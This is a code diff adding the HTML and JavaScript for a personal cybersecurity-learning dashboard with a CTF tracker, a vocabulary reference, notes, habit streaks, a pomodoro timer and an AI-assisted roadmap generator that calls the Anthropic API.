+      <button class="btn btn-sm btn-blue" onclick="addManualPhase()">+ ADD PHASE</button>
+    </div>
+    <div id="manualPhases" style="max-height:400px;overflow-y:auto;padding-right:4px;"></div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveManualRoadmap()">SAVE ROADMAP</button>
+      <button class="btn btn-ghost" onclick="closeModal('manualRoadmapModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<!-- PASTE & PARSE MODAL -->
+<div class="modal-overlay hidden" id="pasteRoadmapModal">
+  <div class="modal" style="width:700px;">
+    <div class="modal-title">📋 PASTE & PARSE ROADMAP</div>
+    <button class="modal-close" onclick="closeModal('pasteRoadmapModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">ROADMAP TITLE</label>
+      <input type="text" id="pasteRmTitle" placeholder="Give your roadmap a name...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">PASTE YOUR ROADMAP TEXT BELOW (from AI, article, anywhere)</label>
+      <textarea id="pasteRmText" rows="10" placeholder="Paste any roadmap text here. The AI will analyze it and convert it into phases and tasks automatically.
+
+Example:
+Month 1: Learn Python basics - variables, loops, functions
+Month 2: Learn web scraping with requests and BeautifulSoup
+- Install Python and VS Code
+- Complete Python crash course
+..."></textarea>
+    </div>
+    <button class="btn w100" id="parseRmBtn" onclick="parsePastedRoadmap()" style="margin-bottom:10px;">🤖 ANALYZE & CONVERT</button>
+    <div id="parseRmStatus" style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent2);min-height:16px;letter-spacing:1px;"></div>
+  </div>
+</div>
+
+<!-- =================== CTF TRACKER =================== -->
+<div class="page" id="page-ctf">
+  <div class="section-title">CTF TRACKER</div>
+  <div class="ctf-stats" id="ctfStats"></div>
+
+  <div class="add-ctf-form card">
+    <div class="font-mono text-muted mb-8" style="font-size:11px; letter-spacing:1px;">LOG A CTF / CHALLENGE</div>
+    <div class="form-inline">
+      <div class="form-row"><input type="text" id="ctfName" placeholder="Challenge name..." /></div>
+      <div class="form-row" style="flex:0 0 140px;">
+        <select id="ctfPlatform">
+          <option value="TryHackMe">TryHackMe</option>
+          <option value="HackTheBox">HackTheBox</option>
+          <option value="PortSwigger">PortSwigger</option>
+          <option value="PicoCTF">PicoCTF</option>
+          <option value="CTFtime">CTFtime</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+      <div class="form-row" style="flex:0 0 120px;">
+        <select id="ctfDiff">
+          <option value="easy">Easy</option>
+          <option value="medium">Medium</option>
+          <option value="hard">Hard</option>
+        </select>
+      </div>
+      <div class="form-row" style="flex:0 0 100px;">
+        <input type="number" id="ctfPoints" placeholder="Points" min="0" max="9999">
+      </div>
+      <div class="form-row" style="flex:0 0 120px;">
+        <select id="ctfCategory">
+          <option value="Web">Web</option>
+          <option value="Network">Network</option>
+          <option value="Crypto">Crypto</option>
+          <option value="Forensics">Forensics</option>
+          <option value="Pwn">Pwn</option>
+          <option value="OSINT">OSINT</option>
+          <option value="Misc">Misc</option>
+        </select>
+      </div>
+      <button class="btn btn-sm" onclick="addCTF()">LOG IT</button>
+    </div>
+    <div class="form-row mt-8">
+      <input type="text" id="ctfNotes" placeholder="Notes / writeup summary...">
+    </div>
+  </div>
+
+  <div class="section-title">SOLVED CHALLENGES</div>
+  <div id="ctfList"></div>
+</div>
+
+<!-- =================== VOCAB / REFERENCE PAGE =================== -->
+<div class="page" id="page-vocab">
+  <div class="section-title">CYBER VOCABULARY & TOOLS REFERENCE</div>
+
+  <!-- AI Ask Box -->
+  <div class="card card-blue" style="margin-bottom:20px;">
+    <div style="display:flex;gap:8px;align-items:flex-end;flex-wrap:wrap;">
+      <div style="flex:1;min-width:200px;">
+        <div class="form-label">🤖 ASK AI — TYPE ANY CYBER TERM OR CONCEPT</div>
+        <input type="text" id="aiVocabInput" placeholder="e.g. What is a buffer overflow? How does ARP spoofing work?" onkeydown="if(event.key==='Enter')askAI()">
+      </div>
+      <button class="btn btn-blue" onclick="askAI()" id="aiAskBtn">ASK CLAUDE</button>
+      <button class="btn btn-sm btn-ghost" id="aiSaveBtn" onclick="saveAIAnswer()" style="display:none;">+ SAVE TO VOCAB</button>
+    </div>
+    <div id="aiVocabResult" style="display:none;margin-top:14px;padding:14px;background:var(--surface2);border-radius:6px;border:1px solid var(--border);">
+      <div id="aiVocabText" style="font-size:13px;line-height:1.7;color:var(--text);white-space:pre-wrap;"></div>
+    </div>
+  </div>
+
+  <div class="vocab-search">
+    <input type="text" id="vocabSearch" placeholder="search terms, tools, concepts..." oninput="renderVocab()">
+    <select id="vocabCatFilter" onchange="renderVocab()" style="width:auto;min-width:150px;">
+      <option value="all">ALL CATEGORIES</option>
+      <option value="networking">Networking</option>
+      <option value="web">Web Hacking</option>
+      <option value="linux">Linux</option>
+      <option value="tools">Tools</option>
+      <option value="general">General</option>
+    </select>
+    <button class="btn btn-sm btn-blue" onclick="openVocabModal()">+ ADD TERM</button>
+  </div>
+  <div class="vocab-grid" id="vocabGrid"></div>
+</div>
+
+</div><!-- end .main -->
+
+<!-- =================== MODALS =================== -->
+<div class="modal-overlay hidden" id="noteModal">
+  <div class="modal">
+    <div class="modal-title" id="noteModalTitle">NEW NOTE</div>
+    <button class="modal-close" onclick="closeModal('noteModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">TITLE</label>
+      <input type="text" id="noteTitle" placeholder="Note title...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">CONTENT</label>
+      <textarea id="noteBody" placeholder="Write your note..." rows="6"></textarea>
+    </div>
+    <div class="form-row-inline">
+      <div class="form-row" style="flex:1">
+        <label class="form-label">TAG</label>
+        <select id="noteTag">
+          <option value="general">General</option>
+          <option value="web">Web Hacking</option>
+          <option value="linux">Linux</option>
+          <option value="networking">Networking</option>
+          <option value="tool">Tool</option>
+          <option value="important">Important</option>
+        </select>
+      </div>
+    </div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveNote()">SAVE NOTE</button>
+      <button class="btn btn-ghost" onclick="closeModal('noteModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="checklistModal">
+  <div class="modal">
+    <div class="modal-title">NEW CHECKLIST</div>
+    <button class="modal-close" onclick="closeModal('checklistModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">CHECKLIST TITLE</label>
+      <input type="text" id="clTitle" placeholder="Checklist title...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">ITEMS</label>
+      <ul class="checklist-items" id="clItems"></ul>
+      <div class="add-check-row">
+        <input type="text" id="clNewItem" placeholder="Add item..." onkeydown="if(event.key==='Enter')addClItem()">
+        <button class="btn btn-sm btn-blue" onclick="addClItem()">ADD</button>
+      </div>
+    </div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveChecklist()">SAVE LIST</button>
+      <button class="btn btn-ghost" onclick="closeModal('checklistModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="habitModal">
+  <div class="modal">
+    <div class="modal-title">NEW HABIT</div>
+    <button class="modal-close" onclick="closeModal('habitModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">HABIT NAME</label>
+      <input type="text" id="habitName" placeholder="e.g. Daily TryHackMe, Linux practice...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">CATEGORY</label>
+      <select id="habitCat">
+        <option value="cyber">Cybersecurity</option>
+        <option value="study">Study</option>
+        <option value="practice">Practice</option>
+        <option value="fitness">Fitness</option>
+        <option value="misc">Misc</option>
+      </select>
+    </div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveHabit()">ADD HABIT</button>
+      <button class="btn btn-ghost" onclick="closeModal('habitModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="viewNoteModal">
+  <div class="modal">
+    <div class="modal-title" id="viewNoteTitle"></div>
+    <button class="modal-close" onclick="closeModal('viewNoteModal')">✕</button>
+    <div id="viewNoteBody"></div>
+  </div>
+</div>
+
+<div class="modal-overlay hidden" id="vocabModal">
+  <div class="modal">
+    <div class="modal-title">ADD VOCAB / TERM</div>
+    <button class="modal-close" onclick="closeModal('vocabModal')">✕</button>
+    <div class="form-row">
+      <label class="form-label">TERM / TOOL NAME</label>
+      <input type="text" id="vocabTerm" placeholder="e.g. SQL Injection, Burp Suite...">
+    </div>
+    <div class="form-row">
+      <label class="form-label">DEFINITION / DESCRIPTION</label>
+      <textarea id="vocabDef" placeholder="Explain what it is / how to use it..." rows="4"></textarea>
+    </div>
+    <div class="form-row">
+      <label class="form-label">CATEGORY</label>
+      <select id="vocabCat">
+        <option value="web">Web Hacking</option>
+        <option value="networking">Networking</option>
+        <option value="linux">Linux</option>
+        <option value="tools">Tools</option>
+        <option value="general">General</option>
+      </select>
+    </div>
+    <div class="flex gap-8 mt-16">
+      <button class="btn" onclick="saveVocab()">SAVE</button>
+      <button class="btn btn-ghost" onclick="closeModal('vocabModal')">CANCEL</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// =================== DATA STORE ===================
+let store = {
+  notes: [],
+  habits: [],
+  ctf: [],
+  vocab: [],
+  pomoLog: [],
+  roadmapProgress: {},
+};
+let editingNoteId = null;
+let noteFilter = 'all';
+let clItems = [];
+
+function save() { localStorage.setItem('cyberbase', JSON.stringify(store)); }
+function load() {
+  const d = localStorage.getItem('cyberbase');
+  if (d) store = JSON.parse(d);
+  // seed vocab / upgrade if old version (< 20 terms)
+  if (!store.vocab || store.vocab.length < 20) store.vocab = getDefaultVocab();
+  if (!store.ctf) store.ctf = [];
+  if (!store.pomoLog) store.pomoLog = [];
+  if (!store.roadmapProgress) store.roadmapProgress = {};
+}
+
+// =================== CLOCK ===================
+function updateClock() {
+  const now = new Date();
+  document.getElementById('clockDisplay').textContent = now.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+// =================== NAVIGATION ===================
+function showPage(name) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('page-' + name).classList.add('active');
+  event.target.classList.add('active');
+  if (name === 'notes') renderNotes();
+  if (name === 'habits') renderHabits();
+  if (name === 'roadmap') { if (!store.roadmaps) store.roadmaps=[]; renderRoadmapList(); }
+  if (name === 'ctf') renderCTF();
+  if (name === 'vocab') renderVocab();
+  if (name === 'pomodoro') renderPomoLog();
+}
+
+// =================== TOAST ===================
+function toast(msg, color) {
+  const t = document.createElement('div');
+  t.className = 'toast';
+  if (color) t.style.borderColor = color, t.style.color = color;
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 3000);
+}
+
+// =================== MODALS ===================
+function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
+function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
+
+function openNoteModal(id) {
+  editingNoteId = id || null;
+  document.getElementById('noteModalTitle').textContent = id ? 'EDIT NOTE' : 'NEW NOTE';
+  if (id) {
+    const n = store.notes.find(n=>n.id===id);
+    document.getElementById('noteTitle').value = n.title;
+    document.getElementById('noteBody').value = n.body;
+    document.getElementById('noteTag').value = n.tag;
+  } else {
+    document.getElementById('noteTitle').value = '';
+    document.getElementById('noteBody').value = '';
+    document.getElementById('noteTag').value = 'general';
+  }
+  openModal('noteModal');
+}
+function openChecklistModal() {
+  clItems = [];
+  document.getElementById('clTitle').value = '';
+  document.getElementById('clItems').innerHTML = '';
+  document.getElementById('clNewItem').value = '';
+  openModal('checklistModal');
+}
+function openHabitModal() {
+  document.getElementById('habitName').value = '';
+  openModal('habitModal');
+}
+function openVocabModal() {
+  document.getElementById('vocabTerm').value = '';
+  document.getElementById('vocabDef').value = '';
+  openModal('vocabModal');
+}
+
+// =================== NOTES ===================
+function saveNote() {
+  const title = document.getElementById('noteTitle').value.trim();
+  const body = document.getElementById('noteBody').value.trim();
+  if (!title) { toast('> ERROR: title required', '#ff4d6d'); return; }
+  if (editingNoteId) {
+    const n = store.notes.find(n=>n.id===editingNoteId);
+    n.title = title; n.body = body; n.tag = document.getElementById('noteTag').value;
+  } else {
+    store.notes.unshift({ id: Date.now(), title, body, tag: document.getElementById('noteTag').value, type: 'note', date: new Date().toLocaleDateString() });
+  }
+  save(); closeModal('noteModal'); renderNotes(); toast('> NOTE SAVED');
+}
+
+function addClItem() {
+  const v = document.getElementById('clNewItem').value.trim();
+  if (!v) return;
+  clItems.push({ text: v, done: false });
+  document.getElementById('clNewItem').value = '';
+  renderClItems();
+}
+function renderClItems() {
+  const ul = document.getElementById('clItems');
+  ul.innerHTML = clItems.map((item,i) => `
+    <li class="checklist-item">
+      <div class="check-box ${item.done?'checked':''}" onclick="toggleClItem(${i})">${item.done?'✓':''}</div>
+      <span class="check-label ${item.done?'done':''}">${item.text}</span>
+      <button class="icon-btn" onclick="removeClItem(${i})">✕</button>
+    </li>
+  `).join('');
+}
+function toggleClItem(i) { clItems[i].done = !clItems[i].done; renderClItems(); }
+function removeClItem(i) { clItems.splice(i,1); renderClItems(); }
+function saveChecklist() {
+  const title = document.getElementById('clTitle').value.trim();
+  if (!title) { toast('> title required', '#ff4d6d'); return; }
+  store.notes.unshift({ id: Date.now(), title, items: JSON.parse(JSON.stringify(clItems)), type: 'checklist', tag: 'general', date: new Date().toLocaleDateString() });
+  save(); closeModal('checklistModal'); renderNotes(); toast('> CHECKLIST SAVED');
+}
+
+function filterNotes(type, el) {
+  noteFilter = type;
+  document.querySelectorAll('.note-type-tab').forEach(t=>t.classList.remove('active'));
+  el.classList.add('active');
+  renderNotes();
+}
+function renderNotes() {
+  const q = document.getElementById('noteSearch').value.toLowerCase();
+  let notes = store.notes;
+  if (noteFilter !== 'all') notes = notes.filter(n=>n.type===noteFilter);
+  if (q) notes = notes.filter(n=>n.title.toLowerCase().includes(q)||(n.body||'').toLowerCase().includes(q));
+  const grid = document.getElementById('notesGrid');
+  if (!notes.length) { grid.innerHTML = '<div class="empty-state" style="grid-column:1/-1"><div class="empty-icon">📝</div>NO NOTES YET — CREATE ONE</div>'; return; }
+  grid.innerHTML = notes.map(n => {
+    const tagColors = {general:'tag-blue',web:'tag-red',linux:'tag-green',networking:'tag-blue',tool:'tag-gold',important:'tag-red'};
+    if (n.type === 'checklist') {
+      const done = (n.items||[]).filter(i=>i.done).length;
+      const total = (n.items||[]).length;
+      return `<div class="note-card" onclick="viewNote(${n.id})">
+        <div class="note-card-title"><span>${n.title}</span><span class="tag tag-blue">LIST</span></div>
+        <div class="note-card-body">${(n.items||[]).slice(0,4).map(i=>`<div style="display:flex;gap:6px;align-items:center;"><span style="color:${i.done?'var(--accent)':'var(--border)'}">${i.done?'✓':'○'}</span><span class="${i.done?'':''}">${i.text}</span></div>`).join('')}${total>4?`<div class="text-muted" style="font-size:11px;margin-top:4px;">+${total-4} more...</div>`:''}</div>
+        <div class="note-card-footer">
+          <span class="note-date">${n.date}</span>
+          <div class="note-actions">
+            <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--accent4)">${done}/${total}</span>
+            <button class="icon-btn" onclick="event.stopPropagation();deleteNote(${n.id})">🗑</button>
+          </div>
+        </div>
+      </div>`;
+    }
+    return `<div class="note-card" onclick="viewNote(${n.id})">
+      <div class="note-card-title"><span>${n.title}</span><span class="tag ${tagColors[n.tag]||'tag-blue'}">${n.tag||'general'}</span></div>
+      <div class="note-card-body">${(n.body||'').substring(0,120)}${(n.body||'').length>120?'...':''}</div>
+      <div class="note-card-footer">
+        <span class="note-date">${n.date}</span>
+        <div class="note-actions">
+          <button class="icon-btn" onclick="event.stopPropagation();openNoteModal(${n.id})">✏</button>
+          <button class="icon-btn" onclick="event.stopPropagation();deleteNote(${n.id})">🗑</button>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+function viewNote(id) {
+  const n = store.notes.find(n=>n.id===id);
+  document.getElementById('viewNoteTitle').textContent = n.title;
+  if (n.type === 'checklist') {
+    document.getElementById('viewNoteBody').innerHTML = `<ul class="checklist-items">${(n.items||[]).map((item,i)=>`
+      <li class="checklist-item">
+        <div class="check-box ${item.done?'checked':''}" onclick="toggleViewCL(${id},${i})">${item.done?'✓':''}</div>
+        <span class="check-label ${item.done?'done':''}">${item.text}</span>
+      </li>`).join('')}</ul>`;
+  } else {
+    document.getElementById('viewNoteBody').innerHTML = `<div style="white-space:pre-wrap;font-size:14px;line-height:1.7;color:var(--text)">${n.body}</div>`;
+  }
+  openModal('viewNoteModal');
+}
+function toggleViewCL(noteId, itemIdx) {
+  const n = store.notes.find(n=>n.id===noteId);
+  n.items[itemIdx].done = !n.items[itemIdx].done;
+  save(); viewNote(noteId); renderNotes();
+}
+function deleteNote(id) {
+  store.notes = store.notes.filter(n=>n.id!==id);
+  save(); renderNotes(); toast('> NOTE DELETED', '#ff4d6d');
+}
+
+// =================== HABITS ===================
+function saveHabit() {
+  const name = document.getElementById('habitName').value.trim();
+  if (!name) { toast('> name required','#ff4d6d'); return; }
+  store.habits.push({ id: Date.now(), name, cat: document.getElementById('habitCat').value, streak: 0, best: 0, history: [], lastDone: null });
+  save(); closeModal('habitModal'); renderHabits(); toast('> HABIT ADDED');
+}
+function todayStr() { return new Date().toISOString().split('T')[0]; }
+function checkHabitToday(id) {
+  const h = store.habits.find(h=>h.id===id);
+  const today = todayStr();
+  if (h.lastDone === today) {
+    h.history = h.history.filter(d=>d!==today);
+    h.lastDone = null;
+    recalcStreak(h);
+  } else {
+    if (!h.history.includes(today)) h.history.push(today);
+    h.lastDone = today;
+    recalcStreak(h);
+  }
+  save(); renderHabits();
+}
+function recalcStreak(h) {
+  let streak = 0;
+  const d = new Date();
+  while(true) {
+    const s = d.toISOString().split('T')[0];
+    if (h.history.includes(s)) { streak++; d.setDate(d.getDate()-1); }
+    else break;
+  }
+  h.streak = streak;
+  if (streak > h.best) h.best = streak;
+}
+function deleteHabit(id) {
+  store.habits = store.habits.filter(h=>h.id!==id);
+  save(); renderHabits(); toast('> HABIT REMOVED','#ff4d6d');
+}
+function renderHabits() {
+  const today = todayStr();
+  // summary
+  const totalStreak = store.habits.reduce((a,h)=>a+h.streak,0);
+  const doneTodayCount = store.habits.filter(h=>h.lastDone===today).length;
+  document.getElementById('streakSummary').innerHTML = `
+    <div class="streak-stat"><div class="streak-num">${store.habits.length}</div><div class="streak-label">HABITS</div></div>
+    <div class="streak-stat"><div class="streak-num" style="color:var(--accent4)">${doneTodayCount}</div><div class="streak-label">DONE TODAY</div></div>
+    <div class="streak-stat"><div class="streak-num" style="color:var(--accent2)">${totalStreak}</div><div class="streak-label">TOTAL STREAK</div></div>
+  `;
+  const list = document.getElementById('habitsList');
+  if (!store.habits.length) { list.innerHTML = '<div class="empty-state"><div class="empty-icon">🔥</div>NO HABITS — ADD YOUR FIRST ONE</div>'; return; }
+  list.innerHTML = store.habits.map(h => {
+    const doneToday = h.lastDone === today;
+    // last 30 days
+    const days30 = [];
+    for (let i=29;i>=0;i--) { const d=new Date(); d.setDate(d.getDate()-i); days30.push(d.toISOString().split('T')[0]); }
+    const rate = Math.round((h.history.filter(d=>days30.includes(d)).length/30)*100);
+    // weekly chart (last 7 weeks)
+    const weeks = [];
+    for (let w=6;w>=0;w--) {
+      let c=0;
+      for (let d=0;d<7;d++) { const dt=new Date(); dt.setDate(dt.getDate()-w*7-d); if(h.history.includes(dt.toISOString().split('T')[0])) c++; }
+      weeks.push(c);
+    }
+    const maxW = Math.max(...weeks,1);
+    const catColors = {cyber:'var(--accent)',study:'var(--accent2)',practice:'var(--accent4)',fitness:'var(--accent3)',misc:'#a855f7'};
+    const col = catColors[h.cat]||'var(--accent)';
+    return `<div class="habit-card">
+      <div class="habit-header">
+        <div>
+          <div class="habit-name">${h.name}</div>
+          <div class="text-muted font-mono" style="font-size:10px;margin-top:2px;">${h.cat.toUpperCase()} &nbsp;|&nbsp; BEST: ${h.best} DAYS</div>
+        </div>
+        <div class="habit-meta">
+          <div class="habit-streak">${h.streak}🔥</div>
+          <button class="habit-today-btn ${doneToday?'checked':''}" onclick="checkHabitToday(${h.id})">${doneToday?'✓ DONE':'MARK DONE'}</button>
+          <button class="icon-btn" onclick="deleteHabit(${h.id})">🗑</button>
+        </div>
+      </div>
+      <div class="habit-grid">
+        ${days30.map(d=>`<div class="habit-day ${h.history.includes(d)?'done':''} ${d===today?'today':''}" title="${d}"></div>`).join('')}
+      </div>
+      <div class="chart-bars" style="margin-top:12px;">
+        ${weeks.map((c,i)=>`<div class="chart-bar" style="height:${Math.max(4,(c/maxW)*80)}px;background:${c?col:'var(--surface2)'};opacity:${0.5+0.5*(c/maxW)}" title="Week ${i+1}: ${c}/7 days"></div>`).join('')}
+      </div>
+      <div class="chart-labels">${['W1','W2','W3','W4','W5','W6','W7'].map(l=>`<div class="chart-label">${l}</div>`).join('')}</div>
+      <div class="habit-progress-bar"><div class="habit-progress-fill" style="width:${rate}%; background:linear-gradient(90deg,${col},var(--accent2))"></div></div>
+      <div class="text-muted font-mono mt-8" style="font-size:10px; text-align:right;">${rate}% LAST 30 DAYS</div>
+    </div>`;
+  }).join('');
+}
+
+// =================== POMODORO ===================
+let pomoState = { mode:'work', running:false, timeLeft:25*60, totalSecs:25*60, session:1, totalFocus:0 };
+let pomoTimer = null;
+const POMO_MODES = { work:{label:'FOCUS SESSION',color:'#00ff88'}, short:{label:'SHORT BREAK',color:'#00c4ff'}, long:{label:'LONG BREAK',color:'#ffd700'} };
+
+function setPomoMode(mode) {
+  if (pomoState.running) return;
+  pomoState.mode = mode;
+  document.querySelectorAll('.pomo-mode-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('mode'+mode.charAt(0).toUpperCase()+mode.slice(1)).classList.add('active');
+  updatePomoSettings();
+}
+function updatePomoSettings() {
+  if (pomoState.running) return;
+  const mins = { work: parseInt(document.getElementById('setWork').value)||25, short: parseInt(document.getElementById('setShort').value)||5, long: parseInt(document.getElementById('setLong').value)||15 };
+  pomoState.timeLeft = mins[pomoState.mode]*60;
+  pomoState.totalSecs = pomoState.timeLeft;
+  updatePomoDisplay();
+}
+function updatePomoDisplay() {
+  const m = Math.floor(pomoState.timeLeft/60).toString().padStart(2,'0');
+  const s = (pomoState.timeLeft%60).toString().padStart(2,'0');
+  document.getElementById('pomoDigits').textContent = `${m}:${s}`;
+  const mode = POMO_MODES[pomoState.mode];
+  document.getElementById('pomoModeLabel').textContent = mode.label;
+  document.getElementById('pomoSession').textContent = `SESSION #${pomoState.session}`;
+  const fill = document.getElementById('pomoRingFill');
+  const circ = 779;
+  const progress = pomoState.timeLeft / pomoState.totalSecs;
+  fill.style.strokeDashoffset = circ * (1-progress);
+  fill.style.stroke = mode.color;
+  document.getElementById('pomoPlayBtn').textContent = pomoState.running ? '⏸' : '▶';
+  document.getElementById('pomoPlayBtn').classList.toggle('pause', pomoState.running);
+}
+function togglePomo() {
+  if (pomoState.running) { clearInterval(pomoTimer); pomoState.running=false; }
+  else { pomoState.running=true; pomoTimer=setInterval(tickPomo,1000); }
+  updatePomoDisplay();
+}
+function tickPomo() {
+  pomoState.timeLeft--;
+  if (pomoState.timeLeft <= 0) {
+    clearInterval(pomoTimer); pomoState.running=false;
+    const isWork = pomoState.mode==='work';
+    if (isWork) { pomoState.totalFocus += pomoState.totalSecs; logPomoSession(); }
+    pomoState.session++;
+    playBeep();
+    toast(isWork ? '> SESSION COMPLETE! TAKE A BREAK 🎉' : '> BREAK DONE! BACK TO WORK 💪', isWork?'#00ff88':'#ffd700');
+    // auto switch
+    if (isWork) { setPomoMode(pomoState.session%4===0?'long':'short'); }
+    else setPomoMode('work');
+    return;
+  }
+  updatePomoDisplay();
+}
+function resetPomo() { clearInterval(pomoTimer); pomoState.running=false; updatePomoSettings(); }
+function skipPomo() { clearInterval(pomoTimer); pomoState.running=false; pomoState.timeLeft=0; tickPomo(); }
+function playBeep() {
+  try {
+    const ctx = new (window.AudioContext||window.webkitAudioContext)();
+    const osc = ctx.createOscillator(); const gain = ctx.createGain();
+    osc.connect(gain); gain.connect(ctx.destination);
+    osc.frequency.value=880; osc.type='sine';
+    gain.gain.setValueAtTime(0.3,ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+1.5);
+    osc.start(); osc.stop(ctx.currentTime+1.5);
+  } catch(e){}
+}
+function logPomoSession() {
+  if (!store.pomoLog) store.pomoLog = [];
+  store.pomoLog.unshift({ time: new Date().toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'}), date: new Date().toLocaleDateString(), duration: Math.floor(pomoState.totalSecs/60), session: pomoState.session });
+  save(); renderPomoLog();
+}
+function renderPomoLog() {
+  const todayLog = (store.pomoLog||[]).filter(l=>l.date===new Date().toLocaleDateString());
+  const totalMin = todayLog.reduce((a,l)=>a+l.duration,0);
+  document.getElementById('totalFocusTime').textContent = totalMin >= 60 ? `${Math.floor(totalMin/60)}h ${totalMin%60}m` : `${totalMin} min`;
+  const logEl = document.getElementById('pomoLog');
+  if (!todayLog.length) { logEl.innerHTML = '<div class="pomo-log-item" style="justify-content:center;color:var(--text2);padding:24px;">NO SESSIONS YET — START FOCUSING</div>'; return; }
+  logEl.innerHTML = todayLog.map(l=>`<div class="pomo-log-item"><span style="color:var(--accent)">#${l.session}</span><span>FOCUS SESSION</span><span style="color:var(--accent4)">${l.duration} MIN</span><span style="color:var(--text2)">${l.time}</span></div>`).join('');
+}
+
+// init pomo
+updatePomoDisplay();
+
+// =================== ROADMAP (CUSTOM) ===================
+let manualPhases = [];
+let activeRmId = null;
+
+function openAIRoadmapModal() { document.getElementById('aiRmGoal').value=''; document.getElementById('aiRmStatus').textContent=''; openModal('aiRoadmapModal'); }
+function openPasteRoadmapModal() { document.getElementById('pasteRmTitle').value=''; document.getElementById('pasteRmText').value=''; document.getElementById('parseRmStatus').textContent=''; openModal('pasteRoadmapModal'); }
+function openManualRoadmapModal() {
+  manualPhases = [];
+  document.getElementById('manualRmTitle').value='';
+  document.getElementById('manualPhases').innerHTML='';
+  addManualPhase();
+  openModal('manualRoadmapModal');
+}
+
+function addManualPhase(data) {
+  const idx = manualPhases.length;
+  manualPhases.push(data || { label:'', title:'', tasks:[''] });
+  renderManualPhases();
+}
+function renderManualPhases() {
+  document.getElementById('manualPhases').innerHTML = manualPhases.map((p,i) => `
+    <div style="background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:14px;margin-bottom:10px;">
+      <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center;">
+        <input type="text" placeholder="Label (e.g. Month 1, Week 1, Phase 1)" value="${escH(p.label)}" oninput="manualPhases[${i}].label=this.value" style="flex:0 0 180px;">
+        <input type="text" placeholder="Phase title (e.g. Python Basics)" value="${escH(p.title)}" oninput="manualPhases[${i}].title=this.value" style="flex:1;">
+        <button class="btn btn-red btn-sm" onclick="removeManualPhase(${i})">✕</button>
+      </div>
+      <div id="mpTasks_${i}">
+        ${p.tasks.map((t,ti) => `
+          <div style="display:flex;gap:6px;margin-bottom:5px;">
+            <input type="text" placeholder="Task ${ti+1}..." value="${escH(t)}" oninput="manualPhases[${i}].tasks[${ti}]=this.value" style="flex:1;font-size:12px;">
+            <button class="icon-btn" onclick="removeManualTask(${i},${ti})">✕</button>
+          </div>`).join('')}
+      </div>
+      <button class="btn btn-ghost btn-sm" onclick="addManualTask(${i})" style="margin-top:4px;font-size:11px;">+ TASK</button>
+    </div>`).join('');
+}
+function removeManualPhase(i) { manualPhases.splice(i,1); renderManualPhases(); }
+function addManualTask(i) { manualPhases[i].tasks.push(''); renderManualPhases(); }
+function removeManualTask(i,ti) { manualPhases[i].tasks.splice(ti,1); renderManualPhases(); }
+function escH(s){ return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+function saveManualRoadmap() {
+  const title = document.getElementById('manualRmTitle').value.trim();
+  if (!title) { toast('> title required','#ff4d6d'); return; }
+  const phases = manualPhases.filter(p=>p.title||p.tasks.some(t=>t.trim()));
+  if (!phases.length) { toast('> add at least one phase','#ff4d6d'); return; }
+  if (!store.roadmaps) store.roadmaps = [];
+  store.roadmaps.unshift({ id: Date.now(), title, phases: phases.map(p=>({...p, tasks: p.tasks.filter(t=>t.trim())})), progress:{}, created: new Date().toLocaleDateString() });
+  save(); closeModal('manualRoadmapModal'); renderRoadmapList(); toast('> ROADMAP SAVED ✓');
+}
+
+async function generateAIRoadmap() {
+  const goal = document.getElementById('aiRmGoal').value.trim();
+  if (!goal) { toast('> describe your goal','#ff4d6d'); return; }
+  const btn = document.getElementById('aiRmGenBtn');
+  const status = document.getElementById('aiRmStatus');
+  btn.disabled = true; btn.textContent = 'GENERATING...';
+  status.textContent = '> AI is building your roadmap...';
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        model:'claude-sonnet-4-20250514',
+        max_tokens:1000,
+        system:`You are a learning roadmap generator. The user gives you a goal and you return a structured roadmap as JSON only. No preamble, no markdown, just raw JSON.
+
+Return this exact structure:
+{"title":"Roadmap Title","phases":[{"label":"Month 1","title":"Phase Title","tasks":["Task 1","Task 2","Task 3"]}]}
+
+Rules:
+- 4 to 8 phases depending on complexity
+- 4 to 7 tasks per phase
+- label = time period (Week 1, Month 1, Phase 1, etc.)
+- tasks = concrete, actionable steps
+- Keep tasks short (under 12 words each)
+- Make it practical for a beginner`,
+        messages:[{role:'user',content:`Create a roadmap for: ${goal}`}]
+      })
+    });
+    const data = await res.json();
